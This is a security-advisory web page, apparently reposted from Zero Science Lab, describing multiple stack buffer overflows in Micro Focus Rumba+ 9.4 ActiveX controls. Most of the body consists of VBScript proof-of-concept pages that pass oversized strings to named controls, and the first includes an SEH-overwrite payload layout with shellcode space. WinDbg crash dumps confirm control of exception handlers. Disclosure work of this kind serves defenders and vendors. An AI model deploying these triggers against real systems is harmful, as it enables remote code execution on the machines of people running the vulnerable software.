	
<!DOCTYPE html>
<HTML lang="en">
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<TITLE>Micro Focus Rumba+ v9.4 Multiple Stack Buffer Overflow Vulnerabilities - CXSecurity.com</TITLE>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META name="keywords" content="Micro, Focus, Rumba+, v9.4, Multiple, Stack, Buffer, Overflow, Vulnerabilities, exploit, vulnerability, bug, issue, advisories">
<META name="description" content="Gjoko 'LiquidWorm' Krstic has realised a new security note Micro Focus Rumba+ v9.4 Multiple Stack Buffer Overflow Vulnerabilities ">
<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<META name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.json?b">
<LINK rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
<link href="https://cert.cx/cxstatic/css/b.css?G" rel="stylesheet" type='text/css'/>
</HEAD>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-39628967-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script><BODY ng-app="ui.bootstrap.demo">
<div class="navbar navbar-default navbar-fixed-top" id="frezz">
<div class="container"><div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><IMG SRC="https://cert.cx/cxstatic/images/12018/cxseci.png" width="150" height="20" ALT="Home Page"></a><button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button></div><div class="navbar-collapse collapse" id="navbar-main" ><ul class="nav navbar-nav">
          <li><a href="https://cxsecurity.com/">Home</a></li><li class="active">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Bugtraq<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
<li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
<li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
<li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
<li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
<li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/best/1/">Ranking</a></li>

</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">CVEMAP<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
<li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Search<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/author/">By author</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
<li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
    <li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="http://cifrex.org/">cIFrex</a></li>
<li class="divider"></li>
<li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
<li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/donate/">Donate</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
</ul></li>
</ul>
<ul class="nav navbar-nav navbar-right">
<li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
</ul></div></div></div>
<div id="general"><TABLE width="100%"><TR><TD width="6%"></TD><TD id="boki"></TD><TD id='glowna'><CENTER>
<script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async defer></script>
<script type="text/javascript">
        var CaptchaCallback = function() {
            var recap1 = grecaptcha.render('Recaptcha1', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'setComIt'});
            var recap2 = grecaptcha.render('Recaptcha2', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'onSubmit'});
        };
    </script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
<script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
<TABLE cellpadding="0" cellspacing="0" width="100%"><TR><TD>
<DIV ng-non-bindable><CENTER><h4><B>Micro Focus Rumba+ v9.4 Multiple Stack Buffer Overflow Vulnerabilities</B></h4>
<div class="panel panel-default""><div class="panel-body"><div class="container"><div class="row">
<div class="col-xs-12 col-md-3"><div class="well well-sm"><b>2016.05.26</b></div></div>
<div class="col-xs-12 col-md-6"><div class="well well-sm"><U>Credit:</U> <b> <A HREF="https://cxsecurity.com/author/Gjoko+%26%23039%3BLiquidWorm%26%23039%3B+Krstic/1/">Gjoko &#039;LiquidWorm&#039; Krstic</a>  </b>
</div></div><div class="col-xs-5 col-md-3"><div class="well well-sm">
  <U>Risk:</U> <b>
<span class="label label-danger">High</span></b>
</div></div><div class="col-xs-3 col-md-3"><div class="well well-sm">
  <U>Local:</U> <b>No</b>
</div></div><div class="col-xs-4 col-md-3"><div class="well well-sm">
  <U>Remote:</U> <b><B>Yes</B></span></b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CVE:</U> <b>N/A</b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CWE:</U> <b>N/A</b></div></div></div><P><TABLE width="70%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="9692700437"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR>
</TABLE><P></CENTER></div></div></div><P><DIV style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable><div class="well well-sm premex">Micro Focus Rumba+ v9.4 Multiple Stack Buffer Overflow Vulnerabilities


Vendor: Micro Focus
Product web page: https://www.microfocus.com
Affected version: 9.4.4058.0 and 9.4.0 SP0 Patch0

Affected products/tools : Rumba Desktop 9.4
                          Rumba 9.4 Trace
                          Rumba 9.4 APPC Configuration
                          Rumba 9.4 AS400 Communications
                          Rumba 9.4 AS400 File Transfer
                          Rumba 9.4 Communication Monitor
                          Rumba 9.4 Engine
                          Rumba 9.4 Screen Designer
                          Rumba 9.4 Submit Remote Command ;]
                          Rumba FTP Client 4.5

Summary: Rumba is a terminal emulation solution with UI (User Interface)
modernization properties. Rumba and Rumba+ allows users to connect to
so-called &#039;legacy systems&#039; (typically a mainframe) via desktop, web and
mobile.

Desc: Rumba+ software package suffers from multiple stack buffer overflow
vulnerabilities when parsing large amount of bytes to several functions in
several OLE controls. An attacker can gain access to the system of the affected
node and execute arbitrary code.

Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
           Microsoft Windows 7 Professional SP1 (EN)
           Microsoft Windows 7 Enterprise SP1 (EN)


Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                            @zeroscience


Advisory ID: ZSL-2016-5327
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5327.php


03.02.2016

--


----------------------------
1. MacroName (WdMacCtl.ocx):
----------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:56359FC0-E847-11CE-BE79-02608C8F68F1&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRUMBASYSTEMWdMacCtl.OCX&quot;
prototype  = &quot;Function PlayMacro ( ByVal MacroName As String ) As Boolean&quot;
memberName = &quot;PlayMacro&quot;
progid     = &quot;ObjectXMacro.ObjectXMacro&quot;
argCount   = 1

arg1=String(272, &quot;A&quot;) + &quot;BBBB&quot; + String(16, &quot;C&quot;) + &quot;DDDD&quot; + &quot;EEEE&quot; + String(14700, &quot;C&quot;)
&#039;            ^             ^             ^           ^        ^               ^
&#039;            |             |             |           |        |               |
&#039;-----------junk---------ds:edx-------padding-------nseh-----seh------------scspace----
&#039;                                                                     6224 bytes usable space


target.PlayMacro arg1 

&lt;/script&gt;
&lt;/html&gt;

===

(1d78.52c): Access violation - code c0000005 (!!! second chance !!!)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:WindowsSysWOW64\ntdll.dll - 
eax=00000000 ebx=45454545 ecx=74d72a9c edx=42424242 esi=0032ddc0 edi=00000000
eip=770a15fe esp=0032dd58 ebp=0032ddac iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!NtRaiseException+0x12:
770a15fe 83c404          add     esp,4
0:000&gt; !exchain
0032e7cc: 45454545
Invalid exception stack at 44444444
0:000&gt; d 0032e7cc
0032e7cc  44 44 44 44 45 45 45 45-43 43 43 43 43 43 43 43  DDDDEEEECCCCCCCC
0032e7dc  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0032e7ec  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0032e7fc  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0032e80c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0032e81c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0032e82c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0032e83c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0:000&gt; kb
ChildEBP RetAddr  Args to Child
WARNING: Stack unwind information not available. Following frames may be wrong.
0032ddac 77147415 0032ddc0 0032de10 00000000 ntdll!NtRaiseException+0x12
0032e0e0 7711071a 45454545 fffffffe fffffffe ntdll!RtlRemoteCall+0x236
0032e130 770db3f5 45454545 0000004d 0032e82c ntdll!RtlUlonglongByteSwap+0x1327a
0032e1b0 77090133 0032e1c8 0032e218 0032e1c8 ntdll!LdrRemoveLoadAsDataTable+0xcac
0032e7b0 41414141 42424242 43434343 43434343 ntdll!KiUserExceptionDispatcher+0xf
0032e7b4 42424242 43434343 43434343 43434343 0x41414141
0032e7b8 43434343 43434343 43434343 43434343 0x42424242
0032e7bc 43434343 43434343 43434343 44444444 0x43434343
0032e7c0 43434343 43434343 44444444 45454545 0x43434343
0032e7c4 43434343 44444444 45454545 43434343 0x43434343
0032e7c8 44444444 45454545 43434343 43434343 0x43434343
0032e7cc 45454545 43434343 43434343 43434343 0x44444444
0032e7d0 43434343 43434343 43434343 43434343 0x45454545
0032e7d4 43434343 43434343 43434343 43434343 0x43434343
0032e7d8 43434343 43434343 43434343 43434343 0x43434343
0032e7dc 43434343 43434343 43434343 43434343 0x43434343


-----------------------------
2. NetworkName (iconfig.dll):
-----------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:E1E0A940-BE28-11CF-B4A0-0004AC32AD97&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRUMBAsystemiconfig.dll&quot;
prototype  = &quot;Property Let NetworkName As String&quot;
memberName = &quot;NetworkName&quot;
progid     = &quot;ObjectXSNAConfig.ObjectXSNAConfig&quot;
argCount   = 1
arg1=String(9000000, &quot;B&quot;)
target.NetworkName = arg1
&lt;/script&gt;
&lt;/html&gt;

===

STATUS_STACK_BUFFER_OVERRUN encountered
(2958.3e0): Break instruction exception - code 80000003 (first chance)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:windowssyswow64kernel32.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:windowsSysWOW64MSVCR120.dll - 
eax=00000000 ebx=616c4480 ecx=76280484 edx=003ee021 esi=00000000 edi=003ee794
eip=76280265 esp=003ee268 ebp=003ee2e4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
kernel32!GetProfileStringW+0x12cc9:
76280265 cc              int     3
..
0:000&gt; d esp+400
003ee668  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee678  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee688  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee698  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee6a8  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee6b8  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee6c8  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
003ee6d8  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0:000&gt; u
kernel32!GetProfileStringW+0x12cc9:
76280265 cc              int     3
76280266 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
7628026d e9c574feff      jmp     kernel32!UnhandledExceptionFilter+0x40 (76267737)
76280272 33c0            xor     eax,eax
76280274 40              inc     eax
76280275 c3              ret
76280276 8b65e8          mov     esp,dword ptr [ebp-18h]
76280279 68090400c0      push    0C0000409h
0:000&gt; dds
003ee6e8  42424242
003ee6ec  42424242
003ee6f0  42424242
003ee6f4  42424242
003ee6f8  42424242
003ee6fc  42424242
003ee700  42424242
003ee704  42424242
003ee708  42424242
003ee70c  42424242
003ee710  42424242
003ee714  42424242
003ee718  42424242
003ee71c  42424242
003ee720  42424242
003ee724  42424242
003ee728  42424242
003ee72c  42424242
003ee730  42424242
003ee734  42424242
003ee738  42424242
003ee73c  42424242
003ee740  1e4cd74b
003ee744  003ec760
003ee748  7594d140 OLEAUT32!DispCallFunc+0xa6
003ee74c  006a191c
003ee750  02f50024
003ee754  006a1a7c
003ee758  001df530
003ee75c  003ee754
003ee760  003ee7f0
003ee764  7594cfba OLEAUT32!VarCmp+0xd35


------------------------
3. CPName (iconfig.dll):
------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:E1E0A940-BE28-11CF-B4A0-0004AC32AD97&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRUMBAsystemiconfig.dll&quot;
prototype  = &quot;Property Let CPName As String&quot;
memberName = &quot;CPName&quot;
progid     = &quot;ObjectXSNAConfig.ObjectXSNAConfig&quot;
argCount   = 1
arg1=String(8212, &quot;A&quot;)
target.CPName = arg1
&lt;/script&gt;
&lt;/html&gt;


------------------------------
4. PrinterName (ProfEdit.dll):
------------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:09A1C362-676A-11D2-A0BE-0060B0A25144&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRUMBASystemprofeditProfEdit.Dll&quot;
prototype  = &quot;Property Let PrinterName As String&quot;
memberName = &quot;PrinterName&quot;
progid     = &quot;ProfileEditor.PrintPasteControl&quot;
argCount   = 1
arg1=&quot;http://zeroscience.mk/zslrss.xml&quot;
&#039;or string 10000 bytes
target.PrinterName = arg1
&lt;/script&gt;
&lt;/html&gt;

===

(23f4.4c2c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Micro FocusRUMBASystemprofeditProfEdit.Dll - 
eax=baadf00d ebx=5fab4b10 ecx=baadf00d edx=003857b8 esi=0030e7b8 edi=0030e66c
eip=5fa63a60 esp=0030e5fc ebp=0030e604 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
ProfEdit+0x13a60:
5fa63a60 c6808401000000  mov     byte ptr [eax+184h],0      ds:002b:baadf191=??


----------------------
5. Data (FtxBIFF.dll):
----------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:2E67341B-A697-11D4-A084-0060B0C3E4EC&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRUMBAAS400FtxBIFF.dll&quot;
prototype  = &quot;Function WriteRecords ( ByVal Row As Long ,  ByVal Col As Long ,  ByVal DataType As Long ,  ByVal Data As String ) As Boolean&quot;
memberName = &quot;WriteRecords&quot;
progid     = &quot;FTXBIFFLib.AS400FtxBIFF&quot;
argCount   = 4
arg1=2
arg2=3
arg3=r
arg4=String(100000, &quot;A&quot;)
target.WriteRecords arg1 ,arg2 ,arg3 ,arg4 
&lt;/script&gt;
&lt;/html&gt;

===

(1164.1dd4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Micro FocusRUMBAAS400FtxBIFF.dll - 
eax=00000000 ebx=56c0a928 ecx=757bd0c4 edx=fffff000 esi=baadf00d edi=0036eba8
eip=56bf3011 esp=0033ddc8 ebp=0033ddd4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
FtxBIFF+0x3011:
56bf3011 837e2020        cmp     dword ptr [esi+20h],20h ds:002b:baadf02d=????????
0:000&gt; d esp
0033ddc8  f0 dd 33 00 0d f0 ad ba-0d f0 ad ba 48 eb 36 00  ..3.........H.6.
0033ddd8  2c 83 bf 56 02 00 00 00-03 00 00 00 00 00 00 00  ,..V............
0033dde8  f0 dd 33 00 40 eb 36 00-41 41 41 41 41 41 41 41  ..3.@.6.AAAAAAAA
0033ddf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0033de08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0033de18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0033de28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0033de38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA


-----------------------------------
6. Serialized (NMSecComParams.dll):
-----------------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:30A01218-C999-4C40-91AE-D8AE4C884A9B&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRSSNMSecComParams.dll&quot;
prototype  = &quot;Property Let Serialized As String&quot;
memberName = &quot;Serialized&quot;
progid     = &quot;NMSECCOMPARAMSLib.SSL3&quot;
argCount   = 1
arg1=String(1333200, &quot;A&quot;)
target.Serialized = arg1
&lt;/script&gt;
&lt;/html&gt;

===

(1508.1a9c): Stack overflow - code c00000fd (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Micro FocusRSSNMSecComParams.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Windowssyswow64OLEAUT32.dll - 
eax=00362000 ebx=1003efa0 ecx=001d369c edx=0045e600 esi=0045e8b0 edi=0045e6d4
eip=100366b7 esp=0045e640 ebp=0045e684 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
NMSecComParams!DllUnregisterServer+0x4617:
100366b7 8500            test    dword ptr [eax],eax  ds:002b:00362000=00000000


---------------------------------
7. UserName (NMSecComParams.dll):
---------------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:3597EAD7-8E7A-4276-AF12-40F8BD515921&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRSSNMSecComParams.dll&quot;
prototype  = &quot;Property Let UserName As String&quot;
memberName = &quot;UserName&quot;
progid     = &quot;NMSECCOMPARAMSLib.FirewallProxy&quot;
argCount   = 1
arg1=String(1026000, &quot;A&quot;)
target.UserName = arg1
&lt;/script&gt;
&lt;/html&gt;

===

(1620.16bc): Stack overflow - code c00000fd (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Micro FocusRSSNMSecComParams.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Windowssyswow64OLEAUT32.dll - 
eax=000d2000 ebx=1003edd0 ecx=00000000 edx=003e390a esi=001ceba8 edi=001cea5c
eip=100366b7 esp=001ce9e4 ebp=001cea0c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
NMSecComParams!DllUnregisterServer+0x4617:
100366b7 8500            test    dword ptr [eax],eax  ds:002b:000d2000=00000000


-------------------------
8. LUName (ProfEdit.dll):
-------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:5A01664E-6CF1-11D2-A0C2-0060B0A25144&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusRUMBASystemprofeditProfEdit.Dll&quot;
prototype  = &quot;Property Let LUName As String&quot;
memberName = &quot;LUName&quot;
progid     = &quot;ProfileEditor.MFSNAControl&quot;
argCount   = 1
arg1=String(14356, &quot;A&quot;)
target.LUName = arg1
&lt;/script&gt;
&lt;/html&gt;

===

(f10.1cb8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Micro FocusRUMBASystemprofeditProfEdit.Dll - 
eax=baadf00d ebx=55944ba4 ecx=baadf00d edx=005c32b0 esi=0022e738 edi=0022e5ec
eip=558f3a60 esp=0022e578 ebp=0022e580 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
ProfEdit+0x13a60:
558f3a60 c6808401000000  mov     byte ptr [eax+184h],0      ds:002b:baadf191=??


-------------------------
9. newVal (FTPSFtp.dll):
-------------------------

&lt;html&gt;
&lt;object classid=&#039;clsid:ACBBEC6D-7FD4-44E3-B1A4-B442D40F5818&#039; id=&#039;target&#039; /&gt;
&lt;script language=&#039;vbscript&#039;&gt;
targetFile = &quot;C:Program Files (x86)Micro FocusMicro Focus UtilitiesFTP ClientFTPSFtp.dll&quot;
prototype  = &quot;Sub Load ( ByVal newVal As String )&quot;
memberName = &quot;Load&quot;
progid     = &quot;FTPSFTPLib.SFtpSession&quot;
argCount   = 1
arg1=String(13332, &quot;A&quot;)
target.Load arg1 

&lt;/script&gt;
&lt;/html&gt;

===

STATUS_STACK_BUFFER_OVERRUN encountered
(608.f74): Break instruction exception - code 80000003 (first chance)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Windowssyswow64kernel32.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:WindowsSysWOW64MSVCR120.dll - 
eax=00000000 ebx=10027e44 ecx=757d047c edx=0039dc45 esi=00000000 edi=0039e594
eip=757d025d esp=0039de8c ebp=0039df08 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
kernel32!GetProfileStringW+0x12cc1:
757d025d cc              int     3


----------------------
10. Host (FTP Client):
----------------------

For the RUMBA FTP Client PoC, copy ~300 bytes array and paste it in the Host field when creating a new session.
</DIV></P><P class="txt" id="refer"></P></DIV><div class="panel panel-default"">
 <div class="panel-body"><div class="well well-sm"><b><h5><U>References:</U></h5></b><P class="txt"><DIV ng-non-bindable> <DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5327.php', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5327.php</DIV></DIV><BR></div><CENTER>
<TABLE width="75%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="6599633238"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR></TABLE><BR>
<div class="container"><div class="row">
<div class="col-xs-12 col-md-6"><div class="well well-sm">
<CENTER><A HREF="https://cxsecurity.com/ascii/WLB-2016050136"><FONT SIZE="4"><b>See this note in RAW Version</b></FONT></A></CENTER></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2016050136" data-width="50" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></div></div>
<div class="col-xs-12 col-md-12"><div class="well well-sm">
<div class="container">
<div class="group-form inline">
<div class="col-sm-12 col-md-6" valign="middle">
Vote for this issue:
<input type="hidden" id="numberWlb" value="2016050136">
<button type="button" id="dodatnie" class="btn btn-success glyphicon glyphicon-thumbs-up" data-loading-text=" ... "  data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" value="0">         0</button>
<button type="button" id="ujemne" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" value="0">       0</button>
</div>
<div class="col-sm-11 col-md-5" valign="middle" id="barr">
<div class="progress progress-striped" style="margin-top: 11px;" >
<div class="progress-bar progress-bar-success active" id="dodatnieBar" data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" style="width: 50%"><div id="valGreBar">50%</div></div>
<div class="progress-bar progress-bar-danger active" id="ujemneBar" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" style="width: 50%"><div id="valRedBar">50%</div></div>
</div></div></div></div>
<div id="voteCaptcha" class="collapse">
<BR><div class="g-recaptcha" id="Recaptcha2"></div>
